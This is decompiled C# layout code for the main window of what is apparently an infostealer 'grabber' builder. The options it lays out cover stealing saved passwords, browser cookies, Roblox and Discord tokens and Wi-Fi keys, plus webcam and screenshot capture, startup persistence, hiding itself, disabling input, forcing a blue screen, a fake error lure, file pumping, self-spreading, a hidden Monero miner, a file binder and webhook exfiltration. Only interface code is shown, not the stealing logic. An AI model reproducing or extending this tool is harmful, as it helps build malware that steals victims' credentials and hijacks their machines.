			//IL_0119: Unknown result type (might be due to invalid IL or missing references)
			//IL_0123: Expected O, but got Unknown
			//IL_0124: Unknown result type (might be due to invalid IL or missing references)
			//IL_012e: Expected O, but got Unknown
			//IL_012f: Unknown result type (might be due to invalid IL or missing references)
			//IL_0139: Expected O, but got Unknown
			//IL_013a: Unknown result type (might be due to invalid IL or missing references)
			//IL_0144: Expected O, but got Unknown
			//IL_0145: Unknown result type (might be due to invalid IL or missing references)
			//IL_014f: Expected O, but got Unknown
			//IL_0150: Unknown result type (might be due to invalid IL or missing references)
			//IL_015a: Expected O, but got Unknown
			//IL_015b: Unknown result type (might be due to invalid IL or missing references)
			//IL_0165: Expected O, but got Unknown
			//IL_0166: Unknown result type (might be due to invalid IL or missing references)
			//IL_0170: Expected O, but got Unknown
			//IL_0171: Unknown result type (might be due to invalid IL or missing references)
			//IL_017b: Expected O, but got Unknown
			//IL_017c: Unknown result type (might be due to invalid IL or missing references)
			//IL_0186: Expected O, but got Unknown
			//IL_0187: Unknown result type (might be due to invalid IL or missing references)
			//IL_0191: Expected O, but got Unknown
			//IL_0192: Unknown result type (might be due to invalid IL or missing references)
			//IL_019c: Expected O, but got Unknown
			//IL_01b3: Unknown result type (might be due to invalid IL or missing references)
			//IL_01bd: Expected O, but got Unknown
			//IL_01be: Unknown result type (might be due to invalid IL or missing references)
			//IL_01c8: Expected O, but got Unknown
			//IL_01c9: Unknown result type (might be due to invalid IL or missing references)
			//IL_01d3: Expected O, but got Unknown
			//IL_01d4: Unknown result type (might be due to invalid IL or missing references)
			//IL_01de: Expected O, but got Unknown
			//IL_01df: Unknown result type (might be due to invalid IL or missing references)
			//IL_01e9: Expected O, but got Unknown
			//IL_01ea: Unknown result type (might be due to invalid IL or missing references)
			//IL_01f4: Expected O, but got Unknown
			//IL_01f5: Unknown result type (might be due to invalid IL or missing references)
			//IL_01ff: Expected O, but got Unknown
			//IL_0200: Unknown result type (might be due to invalid IL or missing references)
			//IL_020a: Expected O, but got Unknown
			//IL_020b: Unknown result type (might be due to invalid IL or missing references)
			//IL_0215: Expected O, but got Unknown
			//IL_0216: Unknown result type (might be due to invalid IL or missing references)
			//IL_0220: Expected O, but got Unknown
			//IL_0221: Unknown result type (might be due to invalid IL or missing references)
			//IL_022b: Expected O, but got Unknown
			//IL_022c: Unknown result type (might be due to invalid IL or missing references)
			//IL_0236: Expected O, but got Unknown
			//IL_0237: Unknown result type (might be due to invalid IL or missing references)
			//IL_0241: Expected O, but got Unknown
			//IL_0263: Unknown result type (might be due to invalid IL or missing references)
			//IL_026d: Expected O, but got Unknown
			//IL_026e: Unknown result type (might be due to invalid IL or missing references)
			//IL_0278: Expected O, but got Unknown
			//IL_0279: Unknown result type (might be due to invalid IL or missing references)
			//IL_0283: Expected O, but got Unknown
			//IL_0284: Unknown result type (might be due to invalid IL or missing references)
			//IL_028e: Expected O, but got Unknown
			//IL_029a: Unknown result type (might be due to invalid IL or missing references)
			//IL_02a4: Expected O, but got Unknown
			//IL_02a5: Unknown result type (might be due to invalid IL or missing references)
			//IL_02af: Expected O, but got Unknown
			//IL_02b0: Unknown result type (might be due to invalid IL or missing references)
			//IL_02ba: Expected O, but got Unknown
			//IL_02bb: Unknown result type (might be due to invalid IL or missing references)
			//IL_02c5: Expected O, but got Unknown
			//IL_02c6: Unknown result type (might be due to invalid IL or missing references)
			//IL_02d0: Expected O, but got Unknown
			//IL_02dc: Unknown result type (might be due to invalid IL or missing references)
			//IL_02e6: Expected O, but got Unknown
			//IL_02e7: Unknown result type (might be due to invalid IL or missing references)
			//IL_02f1: Expected O, but got Unknown
			//IL_02f2: Unknown result type (might be due to invalid IL or missing references)
			//IL_02fc: Expected O, but got Unknown
			//IL_02fd: Unknown result type (might be due to invalid IL or missing references)
			//IL_0307: Expected O, but got Unknown
			//IL_0308: Unknown result type (might be due to invalid IL or missing references)
			//IL_0312: Expected O, but got Unknown
			//IL_031e: Unknown result type (might be due to invalid IL or missing references)
			//IL_0328: Expected O, but got Unknown
			//IL_0334: Unknown result type (might be due to invalid IL or missing references)
			//IL_033e: Expected O, but got Unknown
			//IL_033f: Unknown result type (might be due to invalid IL or missing references)
			//IL_0349: Expected O, but got Unknown
			//IL_0355: Unknown result type (might be due to invalid IL or missing references)
			//IL_035f: Expected O, but got Unknown
			//IL_0360: Unknown result type (might be due to invalid IL or missing references)
			//IL_036a: Expected O, but got Unknown
			//IL_0371: Unknown result type (might be due to invalid IL or missing references)
			//IL_037b: Expected O, but got Unknown
			//IL_037c: Unknown result type (might be due to invalid IL or missing references)
			//IL_0386: Expected O, but got Unknown
			//IL_0387: Unknown result type (might be due to invalid IL or missing references)
			//IL_0391: Expected O, but got Unknown
			//IL_0392: Unknown result type (might be due to invalid IL or missing references)
			//IL_039c: Expected O, but got Unknown
			//IL_321d: Unknown result type (might be due to invalid IL or missing references)
			//IL_3227: Expected O, but got Unknown
			components = new Container();
			ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(MainForm));
			tabPage1 = new TabPage();
			tabPage2 = new TabPage();
			mainTabControl = new MetroTabControl();
			builderTab = new MetroTabPage();
			metroTabControl2 = new MetroTabControl();
			optionsTab = new MetroTabPage();
			wifiCheckBox1 = new MetroCheckBox();
			copyToTempCheckBox = new MetroCheckBox();
			robloxCheckBox = new MetroCheckBox();
			cookiesCheckBox = new MetroCheckBox();
			disableInputCheckBox = new MetroCheckBox();
			cetrainerCheckBox = new MetroCheckBox();
			webcamCheckBox = new MetroCheckBox();
			screenshotCheckBox = new MetroCheckBox();
			discordCheckBox = new MetroCheckBox();
			passwordsCheckBox = new MetroCheckBox();
			startupCheckBox = new MetroCheckBox();
			hideGrabberCheckBox = new MetroCheckBox();
			bsodCheckBox = new MetroCheckBox();
			extraTab = new MetroTabPage();
			blueTrackBar = new SiticoneMetroTrackBar();
			greenTrackBar = new SiticoneMetroTrackBar();
			redTrackBar = new SiticoneMetroTrackBar();
			poolTextBox = new MetroTextBox();
			walletTextBox = new MetroTextBox();
			moneroMinerCheckBox = new MetroCheckBox();
			chooseIconButton = new MetroButton();
			comingSoonPanel3 = new MetroPanel();
			comingSoonLabel3 = new MetroLabel();
			comingSoonPanel2 = new MetroPanel();
			comingSoonLabel2 = new MetroLabel();
			spreadMessage = new MetroTextBox();
			autoSpreadCheckBox = new MetroCheckBox();
			embedColorCheckBox = new MetroCheckBox();
			errorTitleTextBox = new MetroTextBox();
			embedColorPictureBox = new PictureBox();
			iconPictureBox = new PictureBox();
			errorMessageTextBox = new MetroTextBox();
			iconCheckBox = new MetroCheckBox();
			fakeErrorCheckBox = new MetroCheckBox();
			iconPathTextBox = new MetroTextBox();
			pumpAmountTextBox = new MetroTextBox();
			byteCheckBox = new MetroCheckBox();
			kiloByteCheckBox = new MetroCheckBox();
			filePumperCheckBox = new MetroCheckBox();
			megaByteCheckBox = new MetroCheckBox();
			pluginsTab = new MetroTabPage();
			pluginTextBox = new ZeroitCodeTextBox();
			binderTab = new MetroTabPage();
			removeButton = new MetroButton();
			filesListView = new ListView();
			fileNameHeader = new ColumnHeader();
			fileSizeHeader = new ColumnHeader();
			addButton = new MetroButton();
			compilerTab = new MetroTabPage();
			compileButton = new MetroButton();
			compilerOutputTextBox = new MetroTextBox();
			webhookGroupBox = new GroupBox();
			webhookIDbox = new MetroTextBox();
			emailCheckBox1 = new MetroCheckBox();
			testWebhookButton = new MetroButton();
			webhookTextBox = new MetroTextBox();
			otherTab = new MetroTabPage();
			loginGroupBox = new GroupBox();
			loginButton = new MetroButton();
			phoneLabel = new MetroLabel();
			emailLabel = new MetroLabel();
			usernameLabel = new MetroLabel();
			loginTokenTextBox = new MetroTextBox();
			comingSoonGroupBox = new GroupBox();
			settingsTab = new MetroTabPage();
			groupBox1 = new GroupBox();
			opacityTrackBar = new MetroTrackBar();
			stylesComboBox = new MetroComboBox();
			userInfoGroupBox = new GroupBox();
			userLabel = new MetroLabel();
			expiryLabel = new MetroLabel();
			styleManager = new MetroStyleManager(components);
			txtCookies = new MetroTextBox();
			txtPasswords = new MetroTextBox();
			metroToolTip = new MetroToolTip();
			((Control)(object)mainTabControl).SuspendLayout();
			((Control)(object)builderTab).SuspendLayout();
			((Control)(object)metroTabControl2).SuspendLayout();
			((Control)(object)optionsTab).SuspendLayout();
			((Control)(object)extraTab).SuspendLayout();
			((Control)(object)comingSoonPanel3).SuspendLayout();
			((Control)(object)comingSoonPanel2).SuspendLayout();
			((ISupportInitialize)embedColorPictureBox).BeginInit();
			((ISupportInitialize)iconPictureBox).BeginInit();
			((Control)(object)pluginsTab).SuspendLayout();
			((ISupportInitialize)pluginTextBox).BeginInit();
			((Control)(object)binderTab).SuspendLayout();
			((Control)(object)compilerTab).SuspendLayout();
			webhookGroupBox.SuspendLayout();
			((Control)(object)otherTab).SuspendLayout();
			loginGroupBox.SuspendLayout();
			((Control)(object)settingsTab).SuspendLayout();
			groupBox1.SuspendLayout();
			userInfoGroupBox.SuspendLayout();
			((ISupportInitialize)styleManager).BeginInit();
			((Control)this).SuspendLayout();
			tabPage1.Location = new Point(4, 53);
			tabPage1.Name = "tabPage1";
			tabPage1.Padding = new Padding(3);
			tabPage1.Size = new Size(192, 43);
			tabPage1.TabIndex = 0;
			tabPage1.Text = "tabPage1";
			tabPage1.UseVisualStyleBackColor = true;
			tabPage2.Location = new Point(4, 53);
			tabPage2.Name = "tabPage2";
			tabPage2.Padding = new Padding(3);
			tabPage2.Size = new Size(192, 43);
			tabPage2.TabIndex = 3;
			tabPage2.Text = "tabPage2";
			tabPage2.UseVisualStyleBackColor = true;
			((Control)(object)mainTabControl).Controls.Add((Control)(object)builderTab);
			((Control)(object)mainTabControl).Controls.Add((Control)(object)otherTab);
			((Control)(object)mainTabControl).Controls.Add((Control)(object)settingsTab);
			((Control)(object)mainTabControl).Location = new Point(23, 63);
			((TabControl)(object)mainTabControl).Multiline = true;
			((Control)(object)mainTabControl).Name = "mainTabControl";
			((TabControl)(object)mainTabControl).SelectedIndex = 0;
			((Control)(object)mainTabControl).Size = new Size(915, 441);
			((TabControl)(object)mainTabControl).SizeMode = TabSizeMode.Fixed;
			((Control)(object)mainTabControl).TabIndex = 42;
			mainTabControl.set_Theme((MetroThemeStyle)2);
			mainTabControl.set_UseSelectable(true);
			((Panel)(object)builderTab).BorderStyle = BorderStyle.FixedSingle;
			((Control)(object)builderTab).Controls.Add((Control)(object)metroTabControl2);
			((Control)(object)builderTab).Controls.Add(webhookGroupBox);
			builderTab.set_HorizontalScrollbarBarColor(true);
			builderTab.set_HorizontalScrollbarHighlightOnWheel(false);
			builderTab.set_HorizontalScrollbarSize(10);
			((TabPage)(object)builderTab).Location = new Point(4, 38);
			((Control)(object)builderTab).Name = "builderTab";
			((Control)(object)builderTab).Size = new Size(907, 399);
			((TabPage)(object)builderTab).TabIndex = 0;
			((Control)(object)builderTab).Text = "Builder";
			builderTab.set_Theme((MetroThemeStyle)2);
			builderTab.set_VerticalScrollbarBarColor(true);
			builderTab.set_VerticalScrollbarHighlightOnWheel(false);
			builderTab.set_VerticalScrollbarSize(10);
			((Control)(object)builderTab).Click += builderTab_Click;
			((Control)(object)metroTabControl2).Controls.Add((Control)(object)optionsTab);
			((Control)(object)metroTabControl2).Controls.Add((Control)(object)extraTab);
			((Control)(object)metroTabControl2).Controls.Add((Control)(object)pluginsTab);
			((Control)(object)metroTabControl2).Controls.Add((Control)(object)binderTab);
			((Control)(object)metroTabControl2).Controls.Add((Control)(object)compilerTab);
			((Control)(object)metroTabControl2).Location = new Point(26, 99);
			((Control)(object)metroTabControl2).Name = "metroTabControl2";
			((TabControl)(object)metroTabControl2).SelectedIndex = 0;
			((Control)(object)metroTabControl2).Size = new Size(853, 276);
			((TabControl)(object)metroTabControl2).SizeMode = TabSizeMode.Fixed;
			((Control)(object)metroTabControl2).TabIndex = 18;
			metroTabControl2.set_Theme((MetroThemeStyle)2);
			metroTabControl2.set_UseSelectable(true);
			((Panel)(object)optionsTab).BorderStyle = BorderStyle.FixedSingle;
			((Control)(object)optionsTab).Controls.Add((Control)(object)wifiCheckBox1);
			((Control)(object)optionsTab).Controls.Add((Control)(object)copyToTempCheckBox);
			((Control)(object)optionsTab).Controls.Add((Control)(object)robloxCheckBox);
			((Control)(object)optionsTab).Controls.Add((Control)(object)cookiesCheckBox);
			((Control)(object)optionsTab).Controls.Add((Control)(object)disableInputCheckBox);
			((Control)(object)optionsTab).Controls.Add((Control)(object)cetrainerCheckBox);
			((Control)(object)optionsTab).Controls.Add((Control)(object)webcamCheckBox);
			((Control)(object)optionsTab).Controls.Add((Control)(object)screenshotCheckBox);
			((Control)(object)optionsTab).Controls.Add((Control)(object)discordCheckBox);
			((Control)(object)optionsTab).Controls.Add((Control)(object)passwordsCheckBox);
			((Control)(object)optionsTab).Controls.Add((Control)(object)startupCheckBox);
			((Control)(object)optionsTab).Controls.Add((Control)(object)hideGrabberCheckBox);
			((Control)(object)optionsTab).Controls.Add((Control)(object)bsodCheckBox);
			optionsTab.set_HorizontalScrollbarBarColor(true);
			optionsTab.set_HorizontalScrollbarHighlightOnWheel(false);
			optionsTab.set_HorizontalScrollbarSize(10);
			((TabPage)(object)optionsTab).Location = new Point(4, 38);
			((Control)(object)optionsTab).Name = "optionsTab";
			((Control)(object)optionsTab).Size = new Size(845, 234);
			optionsTab.set_Style((MetroColorStyle)13);
			((TabPage)(object)optionsTab).TabIndex = 0;
			((Control)(object)optionsTab).Text = "Options";
			optionsTab.set_Theme((MetroThemeStyle)2);
			optionsTab.set_VerticalScrollbarBarColor(true);
			optionsTab.set_VerticalScrollbarHighlightOnWheel(false);
			optionsTab.set_VerticalScrollbarSize(10);
			((Control)(object)optionsTab).Click += optionsTab_Click;
			((Control)(object)wifiCheckBox1).AutoSize = true;
			((Control)(object)wifiCheckBox1).Location = new Point(49, 133);
			((Control)(object)wifiCheckBox1).Name = "wifiCheckBox1";
			((Control)(object)wifiCheckBox1).Size = new Size(95, 15);
			((Control)(object)wifiCheckBox1).TabIndex = 36;
			((Control)(object)wifiCheckBox1).Text = "Wifi Recovery";
			wifiCheckBox1.set_Theme((MetroThemeStyle)2);
			metroToolTip.SetToolTip((Control)(object)wifiCheckBox1, "Recovery of the saved-Wifi passwords");
			wifiCheckBox1.set_UseSelectable(true);
			((CheckBox)(object)wifiCheckBox1).CheckedChanged += wifiCheckBox1_CheckedChanged;
			((Control)(object)copyToTempCheckBox).AutoSize = true;
			((Control)(object)copyToTempCheckBox).Location = new Point(468, 70);
			((Control)(object)copyToTempCheckBox).Name = "copyToTempCheckBox";
			((Control)(object)copyToTempCheckBox).Size = new Size(98, 15);
			((Control)(object)copyToTempCheckBox).TabIndex = 35;
			((Control)(object)copyToTempCheckBox).Text = "Copy To Temp";
			copyToTempCheckBox.set_Theme((MetroThemeStyle)2);
			metroToolTip.SetToolTip((Control)(object)copyToTempCheckBox, "Create a copy in the %temp% folder");
			copyToTempCheckBox.set_UseSelectable(true);
			((Control)(object)robloxCheckBox).AutoSize = true;
			((Control)(object)robloxCheckBox).Location = new Point(49, 101);
			((Control)(object)robloxCheckBox).Name = "robloxCheckBox";
			((Control)(object)robloxCheckBox).Size = new Size(119, 15);
			((Control)(object)robloxCheckBox).TabIndex = 34;
			((Control)(object)robloxCheckBox).Text = "ROBLOX Recovery";
			robloxCheckBox.set_Theme((MetroThemeStyle)2);
			metroToolTip.SetToolTip((Control)(object)robloxCheckBox, "Recovery of the .ROBLOSECURITY cookie from ROBLOX");
			robloxCheckBox.set_UseSelectable(true);
			((Control)(object)cookiesCheckBox).AutoSize = true;
			((Control)(object)cookiesCheckBox).Location = new Point(49, 70);
			((Control)(object)cookiesCheckBox).Name = "cookiesCheckBox";
			((Control)(object)cookiesCheckBox).Size = new Size(111, 15);
			((Control)(object)cookiesCheckBox).TabIndex = 32;
			((Control)(object)cookiesCheckBox).Text = "Cookie Recovery";
			cookiesCheckBox.set_Theme((MetroThemeStyle)2);
			metroToolTip.SetToolTip((Control)(object)cookiesCheckBox, "Recovery of cookies from Chrome, Firefox and Edge");
			cookiesCheckBox.set_UseSelectable(true);
			((Control)(object)disableInputCheckBox).AutoSize = true;
			((Control)(object)disableInputCheckBox).Location = new Point(690, 101);
			((Control)(object)disableInputCheckBox).Name = "disableInputCheckBox";
			((Control)(object)disableInputCheckBox).Size = new Size(92, 15);
			((Control)(object)disableInputCheckBox).TabIndex = 31;
			((Control)(object)disableInputCheckBox).Text = "Disable Input";
			disableInputCheckBox.set_Theme((MetroThemeStyle)2);
			metroToolTip.SetToolTip((Control)(object)disableInputCheckBox, "Disable the keyboard and mouse");
			disableInputCheckBox.set_UseSelectable(true);
			((Control)(object)cetrainerCheckBox).AutoSize = true;
			((Control)(object)cetrainerCheckBox).Location = new Point(690, 39);
			((Control)(object)cetrainerCheckBox).Name = "cetrainerCheckBox";
			((Control)(object)cetrainerCheckBox).Size = new Size(86, 15);
			((Control)(object)cetrainerCheckBox).TabIndex = 7;
			((Control)(object)cetrainerCheckBox).Text = ".CETRAINER";
			cetrainerCheckBox.set_Theme((MetroThemeStyle)2);
			metroToolTip.SetToolTip((Control)(object)cetrainerCheckBox, "Create the executable with a .CETRAINER extension ");
			cetrainerCheckBox.set_UseSelectable(true);
			((Control)(object)webcamCheckBox).AutoSize = true;
			((Control)(object)webcamCheckBox).Enabled = false;
			((Control)(object)webcamCheckBox).Location = new Point(270, 39);
			((Control)(object)webcamCheckBox).Name = "webcamCheckBox";
			((Control)(object)webcamCheckBox).Size = new Size(122, 15);
			((Control)(object)webcamCheckBox).TabIndex = 3;
			((Control)(object)webcamCheckBox).Text = "Webcam Snapshot";
			webcamCheckBox.set_Theme((MetroThemeStyle)2);
			metroToolTip.SetToolTip((Control)(object)webcamCheckBox, "Create a snapshot from the camera");
			webcamCheckBox.set_UseSelectable(true);
			((Control)(object)screenshotCheckBox).AutoSize = true;
			((Control)(object)screenshotCheckBox).Enabled = false;
			((Control)(object)screenshotCheckBox).Location = new Point(270, 70);
			((Control)(object)screenshotCheckBox).Name = "screenshotCheckBox";
			((Control)(object)screenshotCheckBox).Size = new Size(81, 15);
			((Control)(object)screenshotCheckBox).TabIndex = 4;
			((Control)(object)screenshotCheckBox).Text = "Screenshot";
			screenshotCheckBox.set_Theme((MetroThemeStyle)2);
			metroToolTip.SetToolTip((Control)(object)screenshotCheckBox, "Create a screenshot from the computer");
			screenshotCheckBox.set_UseSelectable(true);
			((Control)(object)discordCheckBox).AutoSize = true;
			((Control)(object)discordCheckBox).Location = new Point(270, 101);
			((Control)(object)discordCheckBox).Name = "discordCheckBox";
			((Control)(object)discordCheckBox).Size = new Size(114, 15);
			((Control)(object)discordCheckBox).TabIndex = 12;
			((Control)(object)discordCheckBox).Text = "Discord Recovery";
			discordCheckBox.set_Theme((MetroThemeStyle)2);
			metroToolTip.SetToolTip((Control)(object)discordCheckBox, "Trace the discord token after the password has been changed");
			discordCheckBox.set_UseSelectable(true);
			((Control)(object)passwordsCheckBox).AutoSize = true;
			((Control)(object)passwordsCheckBox).Location = new Point(49, 39);
			((Control)(object)passwordsCheckBox).Name = "passwordsCheckBox";
			((Control)(object)passwordsCheckBox).Size = new Size(124, 15);
			((Control)(object)passwordsCheckBox).TabIndex = 5;
			((Control)(object)passwordsCheckBox).Text = "Password Recovery";
			passwordsCheckBox.set_Theme((MetroThemeStyle)2);
			metroToolTip.SetToolTip((Control)(object)passwordsCheckBox, "Recovery of the saved-Passwords");
			passwordsCheckBox.set_UseSelectable(true);
			((CheckBox)(object)passwordsCheckBox).CheckedChanged += passwordsCheckBox_CheckedChanged;
			((Control)(object)startupCheckBox).AutoSize = true;
			((Control)(object)startupCheckBox).Location = new Point(468, 39);
			((Control)(object)startupCheckBox).Name = "startupCheckBox";
			((Control)(object)startupCheckBox).Size = new Size(101, 15);
			((Control)(object)startupCheckBox).TabIndex = 11;
			((Control)(object)startupCheckBox).Text = "Add To Startup";
			startupCheckBox.set_Theme((MetroThemeStyle)2);
			metroToolTip.SetToolTip((Control)(object)startupCheckBox, "Execute at start-up");
			startupCheckBox.set_UseSelectable(true);
			((Control)(object)hideGrabberCheckBox).AutoSize = true;
			((Control)(object)hideGrabberCheckBox).Location = new Point(468, 101);
			((Control)(object)hideGrabberCheckBox).Name = "hideGrabberCheckBox";
			((Control)(object)hideGrabberCheckBox).Size = new Size(93, 15);
			((Control)(object)hideGrabberCheckBox).TabIndex = 6;
			((Control)(object)hideGrabberCheckBox).Text = "Hide Grabber";
			hideGrabberCheckBox.set_Theme((MetroThemeStyle)2);
			metroToolTip.SetToolTip((Control)(object)hideGrabberCheckBox, "Hides the grabber after opening");
			hideGrabberCheckBox.set_UseSelectable(true);
			((Control)(object)bsodCheckBox).AutoSize = true;
			((Control)(object)bsodCheckBox).Location = new Point(690, 70);
			((Control)(object)bsodCheckBox).Name = "bsodCheckBox";
			((Control)(object)bsodCheckBox).Size = new Size(51, 15);
			((Control)(object)bsodCheckBox).TabIndex = 10;
			((Control)(object)bsodCheckBox).Text = "BSoD";
			bsodCheckBox.set_Theme((MetroThemeStyle)2);
			metroToolTip.SetToolTip((Control)(object)bsodCheckBox, "Blue Screen of Death");
			bsodCheckBox.set_UseSelectable(true);
			((Panel)(object)extraTab).BorderStyle = BorderStyle.FixedSingle;
			((Control)(object)extraTab).Controls.Add((Control)(object)blueTrackBar);
			((Control)(object)extraTab).Controls.Add((Control)(object)greenTrackBar);
			((Control)(object)extraTab).Controls.Add((Control)(object)redTrackBar);
			((Control)(object)extraTab).Controls.Add((Control)(object)poolTextBox);
			((Control)(object)extraTab).Controls.Add((Control)(object)walletTextBox);
			((Control)(object)extraTab).Controls.Add((Control)(object)moneroMinerCheckBox);
			((Control)(object)extraTab).Controls.Add((Control)(object)chooseIconButton);
			((Control)(object)extraTab).Controls.Add((Control)(object)comingSoonPanel3);
			((Control)(object)extraTab).Controls.Add((Control)(object)comingSoonPanel2);
			((Control)(object)extraTab).Controls.Add((Control)(object)spreadMessage);
			((Control)(object)extraTab).Controls.Add((Control)(object)autoSpreadCheckBox);
			((Control)(object)extraTab).Controls.Add((Control)(object)embedColorCheckBox);
			((Control)(object)extraTab).Controls.Add((Control)(object)errorTitleTextBox);
			((Control)(object)extraTab).Controls.Add(embedColorPictureBox);
			((Control)(object)extraTab).Controls.Add(iconPictureBox);
			((Control)(object)extraTab).Controls.Add((Control)(object)errorMessageTextBox);
			((Control)(object)extraTab).Controls.Add((Control)(object)iconCheckBox);
			((Control)(object)extraTab).Controls.Add((Control)(object)fakeErrorCheckBox);
			((Control)(object)extraTab).Controls.Add((Control)(object)iconPathTextBox);
			((Control)(object)extraTab).Controls.Add((Control)(object)pumpAmountTextBox);
			((Control)(object)extraTab).Controls.Add((Control)(object)byteCheckBox);
			((Control)(object)extraTab).Controls.Add((Control)(object)kiloByteCheckBox);
			((Control)(object)extraTab).Controls.Add((Control)(object)filePumperCheckBox);
			((Control)(object)extraTab).Controls.Add((Control)(object)megaByteCheckBox);
			extraTab.set_HorizontalScrollbarBarColor(true);
			extraTab.set_HorizontalScrollbarHighlightOnWheel(false);
			extraTab.set_HorizontalScrollbarSize(10);
			((TabPage)(object)extraTab).Location = new Point(4, 35);
			((Control)(object)extraTab).Name = "extraTab";
			((Control)(object)extraTab).Size = new Size(845, 237);
			extraTab.set_Style((MetroColorStyle)13);
			((TabPage)(object)extraTab).TabIndex = 1;
			((Control)(object)extraTab).Text = "Extra";
			extraTab.set_Theme((MetroThemeStyle)2);
			extraTab.set_VerticalScrollbarBarColor(true);
			extraTab.set_VerticalScrollbarHighlightOnWheel(false);
			extraTab.set_VerticalScrollbarSize(10);
			((Control)(object)blueTrackBar).BackColor = Color.Transparent;
			((Control)(object)blueTrackBar).Enabled = false;
			((SiticoneTrackBar)blueTrackBar).set_FillColor(Color.FromArgb(193, 200, 207));
			((SiticoneTrackBar)blueTrackBar).get_HoveredState().set_Parent((TrackBar)(object)blueTrackBar);
			((SiticoneTrackBar)blueTrackBar).set_IndicateFocus(false);
			((Control)(object)blueTrackBar).Location = new Point(644, 92);
			((SiticoneTrackBar)blueTrackBar).set_Maximum(255);
			((Control)(object)blueTrackBar).Name = "blueTrackBar";
			((Control)(object)blueTrackBar).Size = new Size(111, 13);
			((Control)(object)blueTrackBar).TabIndex = 55;
			((SiticoneTrackBar)blueTrackBar).set_ThumbColor(Color.Blue);
			((SiticoneTrackBar)blueTrackBar).set_Value(255);
			((TrackBar)blueTrackBar).add_ValueChanged((EventHandler)blueTrackBar_ValueChanged);
			((Control)(object)greenTrackBar).BackColor = Color.Transparent;
			((Control)(object)greenTrackBar).Enabled = false;
			((SiticoneTrackBar)greenTrackBar).set_FillColor(Color.FromArgb(193, 200, 207));
			((SiticoneTrackBar)greenTrackBar).get_HoveredState().set_Parent((TrackBar)(object)greenTrackBar);
			((SiticoneTrackBar)greenTrackBar).set_IndicateFocus(false);
			((Control)(object)greenTrackBar).Location = new Point(644, 73);
			((SiticoneTrackBar)greenTrackBar).set_Maximum(255);
			((Control)(object)greenTrackBar).Name = "greenTrackBar";
			((Control)(object)greenTrackBar).Size = new Size(111, 13);
			((Control)(object)greenTrackBar).TabIndex = 54;
			((SiticoneTrackBar)greenTrackBar).set_ThumbColor(Color.FromArgb(0, 192, 0));
			((SiticoneTrackBar)greenTrackBar).set_Value(255);
			((TrackBar)greenTrackBar).add_ValueChanged((EventHandler)greenTrackBar_ValueChanged);
			((Control)(object)redTrackBar).BackColor = Color.Transparent;
			((Control)(object)redTrackBar).Enabled = false;
			((SiticoneTrackBar)redTrackBar).set_FillColor(Color.FromArgb(193, 200, 207));
			((SiticoneTrackBar)redTrackBar).get_HoveredState().set_Parent((TrackBar)(object)redTrackBar);
			((SiticoneTrackBar)redTrackBar).set_IndicateFocus(false);
			((Control)(object)redTrackBar).Location = new Point(644, 55);
			((SiticoneTrackBar)redTrackBar).set_Maximum(255);
			((Control)(object)redTrackBar).Name = "redTrackBar";
			((Control)(object)redTrackBar).Size = new Size(111, 13);
			((Control)(object)redTrackBar).TabIndex = 53;
			((SiticoneTrackBar)redTrackBar).set_ThumbColor(Color.Red);
			((SiticoneTrackBar)redTrackBar).set_Value(255);
			((TrackBar)redTrackBar).add_ValueChanged((EventHandler)redTrackBar_ValueChanged);
			poolTextBox.get_CustomButton().set_Image((Image)null);
			((Control)(object)poolTextBox.get_CustomButton()).Location = new Point(147, 2);
			((Control)(object)poolTextBox.get_CustomButton()).Name = "";
			((Control)(object)poolTextBox.get_CustomButton()).Size = new Size(17, 17);
			poolTextBox.get_CustomButton().set_Style((MetroColorStyle)4);
			((Control)(object)poolTextBox.get_CustomButton()).TabIndex = 1;
			poolTextBox.get_CustomButton().set_Theme((MetroThemeStyle)1);
			poolTextBox.get_CustomButton().set_UseSelectable(true);
			((Control)(object)poolTextBox.get_CustomButton()).Visible = false;
			((Control)(object)poolTextBox).Enabled = false;
			((Control)(object)poolTextBox).ForeColor = Color.White;
			poolTextBox.set_Lines(new string[0]);
			((Control)(object)poolTextBox).Location = new Point(235, 152);
			poolTextBox.set_MaxLength(32767);
			((Control)(object)poolTextBox).Name = "poolTextBox";
			poolTextBox.set_PasswordChar('\0');
			poolTextBox.set_PromptText("Pool URL");
			poolTextBox.set_ScrollBars(ScrollBars.None);
			poolTextBox.set_SelectedText("");
			poolTextBox.set_SelectionLength(0);
			poolTextBox.set_SelectionStart(0);
			poolTextBox.set_ShortcutsEnabled(true);
			((Control)(object)poolTextBox).Size = new Size(167, 22);
			((Control)(object)poolTextBox).TabIndex = 47;
			poolTextBox.set_Theme((MetroThemeStyle)2);
			metroToolTip.SetToolTip((Control)(object)poolTextBox, "Pool url e.g: xmr-eu1.nanopool.org:14444");
			poolTextBox.set_UseSelectable(true);
			poolTextBox.set_WaterMark("Pool URL");
			poolTextBox.set_WaterMarkColor(Color.FromArgb(109, 109, 109));
			poolTextBox.set_WaterMarkFont(new Font("Segoe UI", 12f, FontStyle.Italic, GraphicsUnit.Pixel));
			walletTextBox.get_CustomButton().set_Image((Image)null);
			((Control)(object)walletTextBox.get_CustomButton()).Location = new Point(147, 2);
			((Control)(object)walletTextBox.get_CustomButton()).Name = "";
			((Control)(object)walletTextBox.get_CustomButton()).Size = new Size(17, 17);
			walletTextBox.get_CustomButton().set_Style((MetroColorStyle)4);
			((Control)(object)walletTextBox.get_CustomButton()).TabIndex = 1;
			walletTextBox.get_CustomButton().set_Theme((MetroThemeStyle)1);
			walletTextBox.get_CustomButton().set_UseSelectable(true);
			((Control)(object)walletTextBox.get_CustomButton()).Visible = false;
			((Control)(object)walletTextBox).Enabled = false;
			((Control)(object)walletTextBox).ForeColor = Color.White;
			walletTextBox.set_Lines(new string[0]);
			((Control)(object)walletTextBox).Location = new Point(235, 180);
			walletTextBox.set_MaxLength(32767);
			((Control)(object)walletTextBox).Name = "walletTextBox";
			walletTextBox.set_PasswordChar('\0');
			walletTextBox.set_PromptText("Wallet");
			walletTextBox.set_ScrollBars(ScrollBars.None);
			walletTextBox.set_SelectedText("");
			walletTextBox.set_SelectionLength(0);
			walletTextBox.set_SelectionStart(0);
			walletTextBox.set_ShortcutsEnabled(true);
			((Control)(object)walletTextBox).Size = new Size(167, 22);
			((Control)(object)walletTextBox).TabIndex = 48;
			walletTextBox.set_Theme((MetroThemeStyle)2);
			metroToolTip.SetToolTip((Control)(object)walletTextBox, "Wallet address that will get the bitcoin");
			walletTextBox.set_UseSelectable(true);
			walletTextBox.set_WaterMark("Wallet");
			walletTextBox.set_WaterMarkColor(Color.FromArgb(109, 109, 109));
			walletTextBox.set_WaterMarkFont(new Font("Segoe UI", 12f, FontStyle.Italic, GraphicsUnit.Pixel));
